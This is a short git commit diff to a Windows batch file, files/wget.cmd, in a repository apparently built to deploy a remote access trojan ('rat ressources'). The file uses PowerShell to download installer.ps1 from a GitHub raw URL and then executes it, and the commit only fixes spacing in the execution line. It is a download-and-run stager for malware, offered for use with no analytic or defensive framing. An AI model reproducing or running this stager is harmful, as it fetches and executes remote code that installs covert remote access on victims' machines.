d23885c49e9d6e979c3ad5df35b65a969b84f837
riahifiras <120566908+riahifiras@users.noreply.github.com>
2024-04-13 14:22:52 +0100

    wiiiw

--- files/wget.cmd
+++ files/wget.cmd
@@ -7,4 +7,4 @@ start
 REM rat ressources
 
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1"
-powershell"./installer.ps1"
+powershell "./installer.ps1"
